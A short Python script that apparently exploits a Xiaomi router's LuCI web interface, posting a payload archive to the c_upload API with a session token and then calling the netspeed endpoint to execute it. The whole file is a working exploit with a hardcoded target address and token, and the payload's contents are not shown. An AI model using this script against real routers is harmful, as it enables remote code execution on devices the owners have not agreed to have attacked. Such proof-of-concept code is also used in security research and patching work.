#!/usr/bin/env python

import requests

router_ip_address = "192.168.0.46"
stok = "946c766afa2b0282c83547a036e6f50e"
proxies = {'http': ''}
#proxies = {'http': 'http://127.0.0.1:8080'}
payload_name = "payload.tar.gz"

print("uploading the payload...")

r1 = requests.post(
        "http://{}/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(router_ip_address, stok),
        files={"image":open(payload_name, 'rb')},
        proxies=proxies)

print(r1.text)

print("execute the payload...")
r2 = requests.get("http://{}/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(router_ip_address, stok), proxies=proxies)
print(r2.text)
